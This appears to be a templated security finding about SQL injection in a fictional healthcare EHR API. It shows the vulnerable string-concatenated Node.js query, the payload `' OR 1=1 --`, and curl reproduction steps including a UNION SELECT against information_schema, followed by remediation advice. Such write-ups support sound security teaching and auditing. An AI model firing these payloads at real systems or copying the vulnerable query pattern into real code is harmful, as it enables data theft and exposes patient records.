## System

- System: PatientCore EHR API v3.5.0
- Domain: HEALTHCARE / EHR PLATFORM
- Example ID: INJ-0001
- Vulnerability: SQL Injection
- Risk ID: RISK-INJ-001

## Findings

### 1. SQL Injection on `GET /api/v3/users` — String Concatenation in `id` Parameter (Pattern 5.1)

The legacy endpoint `GET /api/v3/users?id=<user_input>` constructs its query via direct string interpolation:

```javascript
const query = `SELECT * FROM users WHERE id = '${req.query.id}'`;
```

An attacker supplies `' OR 1=1 --` as the `id` value. The resulting query becomes:

```sql
SELECT * FROM users WHERE id = '' OR 1=1 --'
```

The `OR 1=1` predicate evaluates to `true` for every row, causing the server to return the entire `users` table — including password hashes and role attributes. The `--` comment token discards the closing quote, preventing syntax errors.

**HAR evidence**: Request `GET /api/v3/users?id=%27%20OR%201=1%20--` with `Authorization: Bearer` token. Response HTTP 200 with array including `{"id": 1, "username": "admin", "password_hash": "$2b$12$secret", "role": "ADMIN"}` and additional users — full table dump confirmed.

**Root Cause (section 2.0, RISK-INJ-001)**:
- Raw string concatenation in Node.js query construction (section 3.0 code snippet).
- No parameterized queries / prepared statements on this endpoint.
- Application connects as `db_owner` — excessive privilege amplifies impact (section 6.0).
- No WAF or input validation middleware on legacy endpoints (section 6.0).

**Healthcare impact**: The `users` table in an EHR system contains clinical staff credentials and role assignments. Exfiltrating `password_hash` values enables offline cracking → credential compromise → unauthorized access to patient records, violating HIPAA Minimum Necessary and Access Control requirements.

## Steps to Reproduce

**Step 1 — Normal baseline:**

```bash
curl -s "https://api.patientcore-ehr.example.com/api/v3/users?id=1" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected: returns the single user with `id=1`.

**Step 2 — SQLi payload (primary HAR attack):**

```bash
curl -s "https://api.patientcore-ehr.example.com/api/v3/users?id=%27%20OR%201%3D1%20--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable outcome: HTTP 200 with all rows from the `users` table, including `admin` password hashes and role attributes.  
Expected secure outcome: HTTP 400 with generic error, or single row / empty result.

**Step 3 — Privilege escalation via over-privileged DB account (section 6.0):**

```bash
curl -s "https://api.patientcore-ehr.example.com/api/v3/users?id=' UNION SELECT null,table_name,null,null FROM information_schema.tables--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable outcome: database table names returned in the response body — enabling further targeted exfiltration.

**Step 4 — Verbose error leak confirmation (section 6.0):**

```bash
curl -s "https://api.patientcore-ehr.example.com/api/v3/users?id='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable outcome: SQL syntax error message exposing table names, column names, or DB engine version.

## Secure Outcome

```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation

- **Use parameterized queries** (RISK-INJ-001): replace `\`SELECT * FROM users WHERE id = '${req.query.id}'\`` with `db.execute("SELECT * FROM users WHERE id = ?", [req.query.id], callback)`.
- **Restrict DB account privileges** (section 6.0): replace `db_owner` with a least-privilege role with only `SELECT` on required tables.
- **Disable verbose error messages in production** (section 6.0): return generic `500`/`400` without DB metadata.
- **Deploy input validation middleware**: reject requests where `id` contains SQL metacharacters (`'`, `"`, `;`, `--`).
- **Audit all raw queries in the codebase**: section 2.0 notes newer endpoints use ORM but `/api/v3/users` was missed — conduct a full audit for similar `raw()` or native query calls.
